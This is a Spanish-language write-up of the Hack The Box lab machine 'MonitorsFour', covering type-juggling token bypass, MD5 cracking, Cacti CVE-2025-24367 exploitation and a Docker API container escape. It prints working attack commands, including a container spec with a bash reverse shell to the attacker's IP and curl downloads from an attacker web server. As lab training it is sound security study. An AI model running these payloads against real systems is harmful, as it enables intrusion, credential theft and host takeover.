---
title: "MonitorsFour"
date: 2026-05-23 20:00:00 +0100
categories: [writeups]
tags: [HTB, TypeJuggingAttack, PHP, Hash, Burpsuite, Easy, Windows]
image:
  path: /assets/img/monitorsfour.png
  alt: "Miniatura del post"
  w: 1200     # Ancho real de la imagen en px (recomendado)
  h: 630      # Alto real (ratio típico 1.91:1) — recomendado por Chirpy
---

# Imagery
En esta máquina trataremos principalmente los siguientes puntos. 

| Contenido |
|-----------|
|-Virtual Hosting |
|-Fuzzing Web |
|-Type Juggling Attack in token parameter |
|-Cracking Hashes |
|-Subdomain Enumeration |
|-User Enumeration - Burpsuite |
|-Cacti 1.2.28 - (CVE-2025-24367) |
|-Docker API - port 2375 - (CVE-2025-9074) |

Lo primero que vamos a hacer, es lanzar un ping contra la máquina objetivo para comprobar que tenemos conectividad con ella. También esto nos va a servir para ver ante qué SO estamos. En máquinas Linux, el valor del TTL es de 64; mientras que en máquinas Windows este valor suele ser de 128. 

![Captura de pantalla 1](/assets/img/monitorsfour/4.jpg)

En este caso, vemos que es de 127. Esto es porque hay un nodo intermedio entre nuestro equipo y el equipo objetivo, y se pierde un valor. Podríamos verlo con el parámetro -R. En este caso, ya sabemos que estamos ante un Windows porque está cercano a 128. 

Nos interesa en primer lugar ver qué puertos tiene abiertos el sistema objetivo, para ello, podemos enumerarlo de la siguiente forma. 

```bash
sudo nmap -p- --open -sS -vvv -n -Pn [IPObjetivo] -oG allPorts
sudo nmap -sC -sV -p[Puertos] [IPObjetivo] -oN targeted
```

![Captura de pantalla 1](/assets/img/monitorsfour/6.jpg)

Vemos que estamos siendo redirigidos a "monitorsfour.htb". Si probamos a visitar el sitio utilizando su IP, no nos va a cargar nada. Se está aplicando Virtual Hosting, por lo tanto, vamos a añadir este nombre de dominio a nuestro /etc/hosts para que nuestro equipo sepa hacia dónde tiene que dirigirse. 


```bash
echo '10.129.10.56\tmonitorsfour.htb' | sudo tee -a /etc/hosts
```

Con esto hecho, ahora poniendo en nuestro navegador tanto el dominio como la IP, debería cargarnos correctamente 

```
http://monitorsfour.htb
```

![Captura de pantalla 2](/assets/img/monitorsfour/8.jpg)

Analizando un poco la web, encontramos un panel de login. Esto nos puede servir para comprobar que efectivamente estamos ante un Windows, o por si el contrario, existe algún subsistema de Linux por detrás, ya que es raro que encontremos nginx. Una forma de comprobarlo, es probar rutas existentes de la siguiente forma. En Linux, es case-sensitive, es decir, si ponemos "lOGin" o "LOGIN", nos va a decir que el recurso no existe. En Windows, no es case-sensitive, es decir, da igual como lo pongamos, que va a apuntar al mismo archivo. De resto, Wappalyzer nos chiva que se está empleando PHP 8.3.27 y poco más. 

```
http://monitorsfour.htb/login
```

![Captura de pantalla 2](/assets/img/monitorsfour/10.jpg)

En cuanto al panel de Login, podemos hacer algunas pruebas para tratar de burlarlo, pero no conseguimos nada. Sin usuarios válidos o existentes, tampoco vamos a realizar ataques de fuerza bruta, por lo que nos toca seguir enumerando. Vamos a realizar Fuzzing para tratar de descubrir directorios ocultos. 

```bash
gobuster dir -u http://monitorsfour.htb -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,js -o hidden_directory
```

![Captura de pantalla 2](/assets/img/monitorsfour/11.jpg)


Empezamos a ver ya algunas cosas interesantes. Revisando estos directorios vamos a ir viendo cositas. Si visitamos /user veremos el siguiente mensaje 

```
http://monitorsfour.htb/user
```

![Captura de pantalla 2](/assets/img/monitorsfour/12.jpg)

"{"error":"Missing token parameter"}". Parece que nos está pidiendo el parámetro token, por lo tanto, vamos a probar cosas en este endpoint. 

```
http://monitorsfour.htb/user?token=test
```

![Captura de pantalla 2](/assets/img/monitorsfour/13.jpg)

Podemos sacar la primera conclusión, y es que el parámetro token es obligatorio. Al probar cualquier cosa, por ejemplo "test" el mensaje que nos da es que el token existe, pero no es válido. Esto nos hace pensar que el servidor puede estar validando un token de autenticación o algo así. Dado que se está empleando PHP, una de las primeras ideas que se nos pueden venir a la cabeza es probar un "Type Juggling Attack". Este tipo de ataque no depende de una versión específica de PHP, si no que depende de como el desarrollador haya escrito el código. En PHP cuando se compara con = =, se convierten los valores a un tipo común antes de compararlos. Esto puede causar coincidencias inesperadas si uno de los valores se interpreta como 0, true, etc. Lo ideal sería utilizar = = = para comparaciones. Podemos documentarnos más en el siguiente artículo 

```
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Type%20Juggling/README.md
https://resources.scitum.com.mx/vulnerabilidad-type-juggling-y-magic-hashes/
```

Para comprobar si la aplicación es vulnerable, podemos tratar de fuzzear en el parámetro token y ver si algún resultado nos muestra una respuesta distinta a la esperada. Podemos si tal antes también crear un pequeño diccionario con una lista de Payloads comunes

```bash
touch payloads.txt
```

```
0
00
0e1
0e123456
true
false
null
[]
]
[
```

Ahora vamos a emplear wfuzz para ver como responde el aplicativo. Vamos a eliminar las solicitudes que nos devuelvan 4 palabras ("Invalid or missing token") ya que es el mensaje que nos dan cuando ponemos un token erróneo. 

```bash
wfuzz -c --hc=404 --hw=4 -t 200 -w payloads.txt 'http://monitorsfour.htb/user?token=FUZZ'
```

![Captura de pantalla 2](/assets/img/monitorsfour/14.jpg)

Vemos que para los Payloads "0e1" "00" "0e123456" y "0", nos devuelve otra cosa. Vamos a echarle un vistazo. Podemos utilizar cualquiera de los Payloads válidos. 

```bash
curl -s -X GET 'http://monitorsfour.htb/user?token=0e1' | jq
```


![Captura de pantalla 2](/assets/img/monitorsfour/15.jpg)

Vemos información de varios usuarios. Quizás el más interesantes sea el del administrador. Tenemos información bastante interesante y una contraseña de 32 caracteres hexadecimales que se corresponde con el formato de un Hash MD5. Vamos a realizar un ataque de fuerza bruta para ver si conseguimos obtener la contraseña en texto claro 

```bash
echo -n  "56b32eb43e6f15395f6c46c1c9e1cd36" | wc -c
```

```bash
hash-identifier 
```

![Captura de pantalla 2](/assets/img/monitorsfour/16.jpg)

Vamos a meter el hash en un archivo llamado hash.txt y vamos a romperlo con hashcat y john 

```
touch hash.txt
```

```
56b32eb43e6f15395f6c46c1c9e1cd36
```

Si queremos hacerlo con hashcat, buscamos el MODE de MD5, que es 0 

```bash
https://hashcat.net/wiki/doku.php?id=example_hashes
```


![Captura de pantalla 2](/assets/img/monitorsfour/17.jpg)


```bash
hashcat --example-hashes | grep -i "md5" -B 10 -A 5
```

![Captura de pantalla 2](/assets/img/monitorsfour/18.jpg)

```bash
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
hashcat -m 0 --show hash.txt
```

![Captura de pantalla 2](/assets/img/monitorsfour/19.jpg)

Si queremos hacerlo con john simplemente utilizaríamos el siguiente comando 

```bash
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --format=raw-md5 --show hash.txt
```

![Captura de pantalla 2](/assets/img/monitorsfour/20.jpg)

Pues tenemos credenciales. Podemos probar con netexec para ver si nos sirven para ganar acceso al sistema por WinRM, pero vamos a ver que no son válidas. 

```bash
netexec winrm 10.129.10.56 -u 'admin' -p 'wonderful1'
netexec winrm 10.129.10.56 -u 'admin' -p 'wonderful1' --local-auth
```

Podemos también probarlas en el panel de login que vimos en el sitio web y ahora sí, tendremos más suerte 

```
http://monitorsfour.htb/login
```

```
Usuario: admin
Contraseña: worderful1
```

![Captura de pantalla 2](/assets/img/monitorsfour/21.jpg)

Tras un buen rato investigando este panel de admin, no encontramos nada realmente útil que pueda servirnos. En este punto, algo que podemos hacer es seguir enumerando cosas, por ejemplo subdominios. Podemos tirar de gobuster o de wfuzz. 

```bash
gobuster vhost -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://monitorsfour.htb --append-domain -o submains.txt
```


![Captura de pantalla 2](/assets/img/monitorsfour/22.jpg)


```bash
wfuzz -c --hc=404 --hw=9 -t 200 -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.monitorsfour.htb" http://monitorsfour.htb
```

![Captura de pantalla 2](/assets/img/monitorsfour/23.jpg)

Pues tenemos un nuevo subdominio que tendremos que investigar y añadir a nuestro /etc/hosts 

```bash
echo '10.129.10.56\tcacti.monitorsfour.htb' | sudo tee -a /etc/hosts
```

Vamos a echarle un vistazo a ver qué encontramos 

```
http://cacti.monitorsfour.htb
```

![Captura de pantalla 2](/assets/img/monitorsfour/24.jpg)

Vemos algo llamado "cacti", la versión 1.2.28 y un panel de Login. Investigando un poco, descubrimos que Cacti, es un software de monitorización que sirve para recopilar métricas de red, sistemas, servidores, mostrar gráficas, estadísticas, alertas, etc. La versión que presenta, es estable y relativamente reciente. Antes de pasar a buscar vulnerabilidades conocidas o empezar a probar cosas, recordar que tenemos unas credenciales. Como siempre, es bueno probarlas en otros lugares por si hay reutilización de contraseña, pero a priori parece que no. 

En este punto, revisando un poco las evidencias hasta ahora, vemos lo siguiente. 

![Captura de pantalla 2](/assets/img/monitorsfour/15.jpg)

El nombre del usuario admin, es Marcus Higgins. Podemos tratar de crearnos un diccionario que contemple variantes de su nombre y apellido, y probar un ataque de fuerza bruta empleando la misma contraseña. 

```bash
touch users.txt
```

```
marcus
higgins
administrator
mhiggins
marcush
```

Ahora podemos abrirnos Burpsuite y realizar un ataque de tipo Snipper probando estos usuarios 

```bash
burpsuite & disown
```

![Captura de pantalla 2](/assets/img/monitorsfour/25.jpg)

Vamos a enviar la petición con CTRL + I al Intruder. Seleccionamos un ataque de tipo Snipper. Marcamos el campo de usuario como Payaload y cargamos la lista de usuarios creada. En el campo password ponemos la contraseña "wonderful1". Ahora quitamos el URL-Encode y le damos a Start Attack.

![Captura de pantalla 2](/assets/img/monitorsfour/26.jpg)

![Captura de pantalla 2](/assets/img/monitorsfour/27.jpg)

Analizando la respuesta, vemos que para el usuario marcus, recibimos un código de estado 302 (Redireccionamiento). Esto tiene mejor pinta, vamos a probar de nuevo a autenticarnos en el panel de Cacti, pero en esta ocasión como el usuario marcus y empleando la misma contraseña 

```
Usuario: marcus
Contrseña: wonderful1
```

![Captura de pantalla 2](/assets/img/monitorsfour/28.jpg)

Ahora ya sí, tenemos mejor suerte y conseguimos ganar acceso al panel de administración de Cacti. Investigando un poco sobre Cacti y vulnerabilidades recientes, descubrimos el siguiente artículo (CVE-2025-24367)

```
https://www.wiz.io/vulnerability-database/cve/cve-2025-24367
https://www.cve.org/CVERecord?id=CVE-2025-24367
```

Nos habla de que un "usuario autenticado de Cacti, puede abusar de la creación de gráficos y de las plantillas de gráficos para crear scripts PHP arbitrarios en la raíz web de la aplicación, lo que provoca la ejecución remota de comandos en el servidor."  Investigando un poco más sobre esta vulnerabilidad CVE-2025-24367, descubrimos un repositorio de GitHub (que además es el mismo creador que esta máquina) que nos proporciona un script en Python para explotar esta vulnerabilidad. 

```
https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC
```

Pues vamos a echarle un vistazo y vamos a ver qué podemos hacer para explotarla. Echándole un vistazo al código, básicamente lo que hace es automatizar el proceso de subida de un archivo malicioso. Luego se autentica en Cacti con las credenciales introducidas, sube el Template y fuerza la ejecución del mismo hasta entablar una Reverse Shell con la IP proporcionada. En nuestro directorio exploits, vamos clonarnos el repositorio y ejecutar el script 

```bash
git clone https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC.git
cd CVE-2025-24367-Cacti-PoC
```

Ahora ya sí, vamos a darle permisos de ejecución y ejecutarlo 

```bash
chmod +x exploit.py
```

Nos ponemos en escucha por Netcat por el puerto 443 por ejemplo 

```bash
nc -nvlp 443
```

```bash
python3 exploit.py -u marcus -p wonderful1 -i 10.10.14.94 -l 443 -url http://cacti.monitorsfour.htb
```

![Captura de pantalla 2](/assets/img/monitorsfour/29.jpg)


Como vemos el exploit se ejecuta correctamente y si vamos a nuestra sesión de Netcat, deberíamos haber ganado una Shell como el usuario www-data en este caso 


![Captura de pantalla 2](/assets/img/monitorsfour/30.jpg)

De hecho, como intuíamos, seguramente estemos en un Windows con un subsistema Linux, ya que hemos ganado acceso a un contenedor (172.18.0.3). Vamos a hacer un tratamiento de la TTY como siempre y ya empezamos a enumerar la máquina objetivo desde dentro para elevar nuestros privilegios y esas cosas 

```bash
script /dev/null -c bash
CTRL + Z
stty raw -echo; fg
reset xterm
# Para hacer CTRL + C
export TERM=xterm
# Para hacer CTRL + L 
stty rows 44 columns 183
# Para arreglar las proporciones
```

También vamos a localizar y catear la flag de user.txt 

```bash
find / -type f -name user.txt 2>/dev/null 
cat /home/marcus/user.txt
```

![Captura de pantalla 2](/assets/img/monitorsfour/31.jpg)

Ahora la idea es elevar nuestros privilegios. Como veíamos antes, no estamos en la IP de la máquina objetivo, si no que estamos en 172.18.0.3, que parece ser un contenedor dentro de la máquina. De hecho si nos vamos a la raíz y listamos archivos y directorios ocultos, vamos a ver ./dockerenv, lo que nos confirma que estamos en un contenedor dentro de Docker. 

```bash
ls -la / 
```

![Captura de pantalla 2](/assets/img/monitorsfour/32.jpg)


Si lanzamos el siguiente comando, vamos a ver cual es la puerta de enlace (Gateway del bridge de Docker), en este caso 172.18.0.1. 

```bash
ip route
```


![Captura de pantalla 2](/assets/img/monitorsfour/33.jpg)

También es recomendable revisar la configuración DNS del contenedor. Vamos a echarle un vistazo al /etc/resolv.conf. Este archivo nos indica qué servidores DNS debe usar el sistema para resolver nombres de dominio. 

```bash
cat /etc/resolv.conf
```

![Captura de pantalla 2](/assets/img/monitorsfour/34.jpg)

Como vemos, 127.0.0.11 es el DNS interno de Docker, que reenvía las consultas al DNS del Host. También vemos el host al que Docker reenvía las consultas, 192.168.65.7, que quiero pensar que es el Host Windows de la máquina objetivo. Por lo tanto, lo que vamos a hacer es enumerar este host para ver que puertos tiene abiertos por ejemplo. 

En este punto, vamos a crear un script rápido que nos permita escanear estos puertos 

```bash
touch port_scan.sh
chmod port_scan.sh
```

```bash
#!/bin/bash

function ctrl_c(){
	echo -e "\n\n[!] Saliendo...\n"
	tput cnorm; exit 1
}

# Ctrl+C
trap ctrl_c INT
tput civis
for port in $(seq 1 65535); do
	timeout 1 bash -c "echo '' > /dev/tcp/192.168.65.7/$port" 2>/dev/null && echo "[+] Puerto $port - OPEN" &
done; wait
tput cnorm
```

Nos montamos un servidor web con Python por el puerto 80 y desde la máquina objetivo vamos a descargarlo con el siguiente comando, darle permisos de ejecución y ejecutarlo 

```bash
curl http://10.10.14.94/port_scan.sh -o port_scan.sh
chmod +x port_scan.sh
./port_scan.sh
```

![Captura de pantalla 2](/assets/img/monitorsfour/35.jpg)


Lo vemos de una forma un poco primitiva, pero nos sirve para ir haciéndonos una pequeña idea. Vemos el puerto 55 (DNS), también el puerto 3128 y el puerto 5555, que por lo que hemos podido investigar suele estar asociado a Android Debug Bridge (ADB), un software de Debugging. Dejamos para el final el puerto 2375, ya que es el más importante en este caso. 

Este puerto se corresponde con una API de Docker. Esto accesible públicamente o desde contenedores, permite crear contenedores, desmontar contenedores, ejecutar comandos, montar volúmenes (incluyendo el disco del hosts), etc. y todo ello, sin proporcionar contraseña. El identificador de esta vulnerabilidad es CVE-2025-9074, y es una vulnerabilidad de seguridad crítica que afecta a Docker Desktop para Windows y macOS. Básicamente lo que nos va a permitir esto, es romper el aislamiento que debería haber entre el contenedor y el host, y de esta forma "escapar" del contenedor para ganar acceso al sistema real y ver los archivos. 

```
https://socprime.com/blog/cve-2025-9074-docker-desktop-vulnerability/
https://www.incibe.es/incibe-cert/alerta-temprana/vulnerabilidades/CVE-2025-9074
```

Lo que vamos a hacer es crear un contenedor malicioso que monte C:\ del host Windows y nos de una Reverse Shell. Vamos a empezar listando las imágenes disponibles, identificar una imagen existente y lanzar un contenedor usando esa imagen válida. 

```bash
curl http://192.168.65.7:2375/images/json
```

![Captura de pantalla 2](/assets/img/monitorsfour/36.jpg)

Se ve un poco caótico porque no podemos utilizar jq, pero podemos identificar en "RepoTags" el nombre de la imagen con su etiqueta. En este caso vemos "docker_setup-nginx-php:latest". Esta es la imagen que usaremos. 

Ahora en nuestra máquina de atacantes, vamos a crear un archivo JSON que contendrá  la información de nuestro contenedor malicioso. 

```bash
touch evil_container.json
```

Le estamos indicando que use la imagen existente en el host y que acabamos de descubrir (docker_setup-nginx-php:latest). Le pasamos la instrucción que realizará, es decir, lanzar una Reverse Shell a nuestra máquina de atacantes y por último monta el disco C del host Windows en la ruta /host_root. En Docker Desktop el disco C: se representa como /mnt/host/c

```JSON
{
  "Image": "docker_setup-nginx-php:latest",
  "Cmd": ["/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.94/443 0>&1"],
  "HostConfig": {
    "Binds": ["/mnt/host/c:/host_root"]
  }
}
```

Ahora nos montamos un servidor web con Python y vamos a pasar este archivo a la máquina objetivo 

```bash
python3 -m http.server 80
```

Lo descargamos en la máquina objetivo. 

```bash
curl http://10.10.14.94/evil_container.json -o evil_container.json
```

![Captura de pantalla 2](/assets/img/monitorsfour/37.jpg)

Ahora desde el contenedor, vamos a crear el contenedor con el JSON malicioso que le hemos pasado. Esto debería devolvernos un JSON con el ID del nuevo contenedor. 

```bash
curl -H "Content-Type: application/json" -d @evil_container.json http://192.168.65.7:2375/containers/create -o response.json
```

![Captura de pantalla 2](/assets/img/monitorsfour/38.jpg)

```
{"Id":"32ec065ab4ea4b2aaf72905c2ba4d76b23973d1c53fe9a7bdda8668d6e252365","Warnings":[]}
```

Ahora simplemente nos queda arrancar el contenedor y esperar que se ejecute bien nuestra Reverse Shell para ganar acceso al sistema como root. Por lo tanto, vamos a ponernos en escucha por Netcat y lanzarlo 

```bash
nc -nvlp 443
```

```bash
curl -X POST http://192.168.65.7:2375/containers/32ec065ab4ea4b2aaf72905c2ba4d76b23973d1c53fe9a7bdda8668d6e252365/start
```

Si volvemos a nuestra sesión de Netcat, veremos que hemos ganado una Shell como el usuario root 


![Captura de pantalla 2](/assets/img/monitorsfour/39.jpg)


Seguimos dentro del contenedor, pero hemos montado la raíz de Windows C:\ en /host_root, por lo tanto, podemos movernos a este directorio y ver los archivos del equipo Windows. 

```bash
cd /host_root
ls -la
```


![Captura de pantalla 2](/assets/img/monitorsfour/40.jpg)

Ya tan solo nos quedaría localizar la Flag root.txt y hacerle un cat 

```bash
cd /host_root/Users/Administrator/Desktop
cat root.txt
```

![Captura de pantalla 2](/assets/img/monitorsfour/41.jpg)



